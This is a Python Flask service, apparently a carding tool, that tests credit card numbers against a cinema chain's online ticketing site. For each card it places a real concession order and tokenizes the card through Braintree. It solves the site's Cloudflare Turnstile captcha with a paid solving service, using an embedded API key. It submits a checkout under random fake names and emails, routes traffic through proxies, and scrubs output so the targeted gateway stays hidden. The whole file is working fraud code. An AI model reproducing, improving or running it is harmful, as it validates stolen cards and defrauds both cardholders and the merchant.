import requests
import json
import time
import sys
import random
import string
import base64
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, request as flask_request, jsonify

app = Flask(__name__)

BASE = 'https://www.westwinddi.com'
API = f'{BASE}/wp-json/wp/v2/api/content/vistaapi'
PAY_API = f'{BASE}/wp-json/wp/v2/api/content/paymentapi'
CINEMA_ID = '2040'
TURNSTILE_SITEKEY = '0x4AAAAAAAhmabPTECvS2gaX'
CAPTCHAAI_KEY = 'jxyqsxyradb0ryoisms20d5equaf4jux'
CAPTCHA_THREADS = 5


def _submit_captcha_task(page_url, proxies=None):
    """Submit a single captcha task and return the task_id."""
    try:
        r = requests.get('https://ocr.captchaai.com/in.php', params={
            'key': CAPTCHAAI_KEY, 'method': 'turnstile',
            'sitekey': TURNSTILE_SITEKEY, 'pageurl': page_url, 'json': '1'
        }, proxies=proxies, timeout=15)
        resp = r.json()
        if resp.get('status') == 1:
            return resp['request']
    except:
        pass
    return None


def _poll_captcha_task(task_id, stop_event, proxies=None):
    """Poll a single captcha task until solved, errored, or stopped."""
    time.sleep(5)
    for _ in range(40):
        if stop_event.is_set():
            return None
        try:
            r = requests.get('https://ocr.captchaai.com/res.php', params={
                'key': CAPTCHAAI_KEY, 'action': 'get', 'id': task_id, 'json': '1'
            }, proxies=proxies, timeout=10)
            result = r.json()
            if result.get('status') == 1:
                return result.get('request', '')
            if 'ERROR' in str(result.get('request', '')):
                return None
        except:
            pass
        time.sleep(2)
    return None


def solve_turnstile(page_url, proxies=None):
    """Race 5 captcha tasks — first to solve wins, rest are cancelled."""
    if not CAPTCHAAI_KEY:
        return ""

    import threading
    stop_event = threading.Event()

    # Submit 5 tasks in parallel
    task_ids = []
    with ThreadPoolExecutor(max_workers=CAPTCHA_THREADS) as pool:
        submit_futures = [pool.submit(_submit_captcha_task, page_url, proxies) for _ in range(CAPTCHA_THREADS)]
        for f in as_completed(submit_futures):
            tid = f.result()
            if tid:
                task_ids.append(tid)

    if not task_ids:
        return ""

    # Poll all tasks in parallel — first solved wins
    token = ""
    with ThreadPoolExecutor(max_workers=len(task_ids)) as pool:
        poll_futures = {pool.submit(_poll_captcha_task, tid, stop_event, proxies): tid for tid in task_ids}
        for f in as_completed(poll_futures):
            result = f.result()
            if result and not token:
                token = result
                stop_event.set()  # signal all other threads to stop

    return token


def check_card(cc_input, proxy=None):
    start_time = time.time()
    
    parts = cc_input.strip().split("|")
    if len(parts) != 4:
        return result_json("", "", "", "", "Invalid format", "N/A", "N/A", 0)
    
    n, m, y, c = parts
    m = m.zfill(2)
    if len(y) == 2:
        y = "20" + y
    
    s = requests.Session()
    proxies_dict = None
    if proxy:
        proxy_url = proxy if '://' in proxy else f'http://{proxy}'
        proxies_dict = {'http': proxy_url, 'https': proxy_url}
        s.proxies = proxies_dict
    
    ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
    s.headers.update({
        'User-Agent': ua,
        'Content-Type': 'application/json',
    })
    
    try:
        # ============================================
        # Step 1: Create Order
        # ============================================
        r = s.post(f'{API}/CreateOrder', json={
            "cinemaId": CINEMA_ID, "userID": ""
        }, timeout=10)
        order_data = r.json()
        if not order_data.get('Result', {}).get('order'):
            return result_json(n, m, y, c, "CreateOrder failed", "N/A", "N/A", elapsed(start_time))
        
        user_session = order_data['Result']['order']['userSessionId']
        s.cookies.set('userSessionId', user_session, domain='www.westwinddi.com', path='/')
        
        page_url = f'{BASE}/ticketing/tickets?cinemacode={CINEMA_ID}&txtSessionId=83946'
        
        # ============================================
        # Step 2: Get cheapest concession item
        # ============================================
        r = s.post(f'{API}/GetConcessionItems', json={
            "cinemaId": CINEMA_ID, "userSessionId": user_session
        }, timeout=10)
        
        conc_data = r.json()
        if not conc_data.get('Result', {}).get('ConcessionTabs'):
            return result_json(n, m, y, c, "No concession items", "N/A", "N/A", elapsed(start_time))
        
        # Find cheapest item
        cheapest = None
        for tab in conc_data['Result']['ConcessionTabs']:
            for item in tab.get('ConcessionItems', []):
                if item.get('PriceInCents', 0) > 0:
                    if cheapest is None or item['PriceInCents'] < cheapest['PriceInCents']:
                        cheapest = dict(item)
        
        if not cheapest:
            return result_json(n, m, y, c, "No priced items", "N/A", "N/A", elapsed(start_time))
        
        amount_cents = cheapest['PriceInCents']
        amount = f"{amount_cents / 100:.2f}"
        
        # ============================================
        # Step 3: Add concession to order
        # ============================================
        cheapest['quantity'] = 1
        cheapest['selectedDiscountCode'] = ''
        for key in ['originalItemData', 'originalItemId', 'upgradeItemData',
                    'selectedUpgradeItemId', 'priceDifferenceInCents', 'originalPriceInCents']:
            cheapest.pop(key, None)
        
        r = s.post(f'{API}/AddConcessionsOrder', json={
            "cinemaId": CINEMA_ID,
            "concessionItems": [cheapest],
            "userSessionId": user_session,
            "seats": [],
            "userID": ""
        }, timeout=15)
        
        add_resp = r.json()
        if not add_resp.get('Result', {}).get('Content', {}).get('Order'):
            return result_json(n, m, y, c, "AddConcession failed", "N/A", "N/A", elapsed(start_time))
        
        order_total = add_resp['Result']['Content']['Order'].get('TotalValueCents', 0)
        amount = f"{order_total / 100:.2f}"
        
        # ============================================
        # Step 4: Get Braintree client token
        # ============================================
        r = s.post(f'{API}/PaymentClientToken', json={
            "cinemaId": CINEMA_ID
        }, timeout=10)
        
        ct_data = r.json()
        if not ct_data.get('IsSuccess'):
            return result_json(n, m, y, c, "No BT token", "N/A", "N/A", elapsed(start_time))
        
        client_token = ct_data['ClientToken']
        padded = client_token + '=' * (4 - len(client_token) % 4) if len(client_token) % 4 else client_token
        decoded = json.loads(base64.b64decode(padded))
        auth_fp = decoded['authorizationFingerprint']
        
        # ============================================
        # Step 5: Tokenize card via Braintree GraphQL
        # ============================================
        fname = random.choice(["James", "William", "Oliver", "Harry", "George", "Thomas", "Jack", "Charlie"])
        lname = random.choice(["Smith", "Jones", "Davis", "Wilson", "Brown", "Taylor", "Clark", "Walker"])
        rand = ''.join(random.choices(string.ascii_lowercase + string.digits, k=5))
        email = f"{fname.lower()}.{rand}@gmail.com"
        phone = f"602{random.randint(1000000, 9999999)}"
        postal = "85301"
        
        bt_headers = {
            'Authorization': f'Bearer {auth_fp}',
            'Braintree-Version': '2018-05-10',
            'Content-Type': 'application/json',
            'User-Agent': ua,
        }
        r = requests.post('https://payments.braintree-api.com/graphql', json={
            "clientSdkMetadata": {
                "source": "client", "integration": "dropin",
                "sessionId": str(random.randint(100000, 999999))
            },
            "query": """mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {
                tokenizeCreditCard(input: $input) {
                    token
                    creditCard {
                        bin brandCode last4
                        binData {
                            prepaid healthcare debit durbinRegulated
                            commercial payroll issuingBank countryOfIssuance productId
                        }
                    }
                }
            }""",
            "variables": {
                "input": {
                    "creditCard": {
                        "number": n, "expirationMonth": m,
                        "expirationYear": y, "cvv": c,
                        "billingAddress": {"postalCode": postal}
                    },
                    "options": {"validate": False}
                }
            },
            "operationName": "TokenizeCreditCard"
        }, headers=bt_headers, proxies=proxies_dict, timeout=15)
        
        if r.status_code != 200:
            return result_json(n, m, y, c, f"Tokenize fail ({r.status_code})", "N/A", "N/A", elapsed(start_time))
        
        bt_res = r.json()
        if bt_res.get('errors'):
            err = bt_res['errors'][0].get('message', 'BT error')
            return result_json(n, m, y, c, err, "N/A", "N/A", elapsed(start_time))
        
        tok = bt_res['data']['tokenizeCreditCard']
        nonce = tok.get('token', '')
        card_info = tok.get('creditCard', {})
        bin_data = card_info.get('binData', {})
        
        card_type = card_info.get('brandCode', 'UNKNOWN')
        if bin_data.get('prepaid') == 'YES':
            card_type += " PREPAID"
        if bin_data.get('debit') == 'YES':
            card_type += " DEBIT"
        issuer = bin_data.get('issuingBank', '')
        country = bin_data.get('countryOfIssuance', '')
        
        if not nonce:
            return result_json(n, m, y, c, "No nonce", "N/A", "N/A", elapsed(start_time))
        
        # ============================================
        # Step 6: Solve Cloudflare Turnstile
        # ============================================
        turnstile_token = solve_turnstile(page_url, proxies=proxies_dict)
        if not turnstile_token and CAPTCHAAI_KEY:
            return result_json(n, m, y, c, "Turnstile solve failed", elapsed(start_time))
        
        # ============================================
        # Step 7: Submit Checkout
        # ============================================
        checkout_headers = {
            'Content-Type': 'application/json',
            'User-Agent': ua,
        }
        if turnstile_token:
            checkout_headers['X-Turnstile-Token'] = turnstile_token
        
        r = s.post(f'{PAY_API}/Checkout', json={
            "PaymentToken": nonce,
            "userSessionId": user_session,
            "Name": f"{fname} {lname}",
            "Email": email,
            "userID": "",
            "skipBraintree": False,
            "remainingOrderValue": -1,
            "OrderRequest": [],
            "isRetry": 0
        }, headers=checkout_headers, timeout=30)
        
        # ============================================
        # Step 8: Parse response
        # ============================================
        try:
            resp = r.json()
        except:
            return result_json(n, m, y, c, f"Non-JSON ({r.status_code})", elapsed(start_time))
        
        return parse_response(resp, n, m, y, c, elapsed(start_time), amount)
    
    except requests.exceptions.Timeout:
        return result_json(n, m, y, c, "Timeout", elapsed(start_time))
    except requests.exceptions.ConnectionError:
        return result_json(n, m, y, c, "Connection Error", elapsed(start_time))
    except Exception as e:
        return result_json(n, m, y, c, f"Error: {str(e)[:120]}", elapsed(start_time))


def parse_response(resp, n, m, y, c, t, amount="1.75"):
    if resp.get('IsSuccess'):
        result = resp.get('Result', {})
        booking_id = result.get('VistaBookingId', '')
        if booking_id:
            return result_json(n, m, y, c, f"Charged ${amount} ✅", t)
    
    error_msg = resp.get('ErrorMessage', '')
    errors = resp.get('Errors', [])
    
    if not error_msg and errors:
        error_msg = errors[0] if isinstance(errors[0], str) else str(errors[0])
    if not error_msg:
        error_msg = str(resp)[:200]
    
    # Clean up prefix
    if error_msg.startswith('Error: '):
        error_msg = error_msg[7:]
    
    return result_json(n, m, y, c, error_msg, t)


def sanitize(msg):
    """Strip any URLs, domains, API paths so the gateway site is never revealed."""
    import re
    msg = re.sub(r'https?://[^\s",\}]+', '', msg)
    msg = re.sub(r'[a-zA-Z0-9-]+\.(com|net|org|io|co|dev|xyz)[^\s]*', '', msg)
    msg = re.sub(r'/wp-json/[^\s"]*', '', msg)
    msg = re.sub(r'/api/[^\s"]*', '', msg)
    msg = re.sub(r'<[^>]+>', '', msg)
    msg = re.sub(r'\s{2,}', ' ', msg).strip(' .,;:')
    if not msg or len(msg) < 3:
        msg = "Gateway Error"
    return msg


def result_json(n, m, y, c, response, t):
    return {
        "card": f"{n}|{m}|{y}|{c}",
        "credit": "@xoxhunterxd",
        "gateway": "Braintree 1.75 USD",
        "response": sanitize(response),
        "time": f"{t}s"
    }


def elapsed(start):
    return round(time.time() - start, 1)


@app.route('/b3')
def b3_endpoint():
    cc = flask_request.args.get('cc')
    if not cc:
        return jsonify({"error": "Missing 'cc' parameter. Usage: /b3?cc=number|mm|yyyy|cvv&pp=proxy"}), 400
    
    proxy = flask_request.args.get('pp')  # optional
    result = check_card(cc, proxy=proxy)
    return jsonify(result)


if __name__ == "__main__":
    import os
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
